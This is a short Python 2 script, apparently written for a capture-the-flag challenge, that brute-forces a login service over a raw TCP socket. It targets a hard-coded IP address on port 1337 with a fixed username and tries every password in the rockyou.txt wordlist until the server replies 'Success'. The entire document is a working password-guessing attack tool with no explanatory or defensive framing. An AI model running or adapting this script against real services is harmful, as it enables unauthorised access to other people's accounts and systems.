#!/usr/bin/python2

# Requires the use of python2

import socket

host = "142.93.136.81"
port = 1337
wordlist = "rockyou.txt"
username = "v0idcache"

print("Requires use of python2")

def brute_force(word):
    print("="*80)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    data = s.recv(1024)
    print("Trying username: " + username)
    s.send(username + "\n")
    data = s.recv(1024)
   
    
    print("Trying password: " + word)
    s.send(word + "\n")
    data = s.recv(1024)

    print("Recieved data: " + data)

    if "Success" in data:
        exit()
   
if __name__ == '__main__':
    with open(wordlist) as fp:
        for word in fp.readlines():
            brute_force(word)


